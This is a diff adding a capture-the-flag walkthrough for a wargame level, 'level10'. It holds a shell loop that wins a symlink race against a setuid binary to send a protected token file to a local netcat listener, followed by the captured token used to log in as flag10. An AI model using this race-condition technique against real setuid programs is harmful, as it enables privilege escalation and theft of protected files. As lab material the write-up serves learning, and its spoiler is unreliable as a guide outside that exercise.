@@ -1,0 +1,24 @@
+> ls -al
+
+> ./level10 token
+> ltrace ./level10 token
+
+*** write scrypt ***
+
+pkill nc
+rm -f /tmp/flag
+touch /tmp/link /tmp/flag
+while true; do
+    nc -l 6969 > /tmp/flag &
+    ln -sf /tmp/link /tmp/change &
+    ./level10 /tmp/change 127.0.0.1 &
+    ln -sf ~/token /tmp/change &
+    if egrep -q '[a-z0-9]{25}' /tmp/flag; then
+        exit 0
+    fi
+done
+
+*******
+> su flag10
+woupa2yuojeeaaed06riuj63c
+> su level11
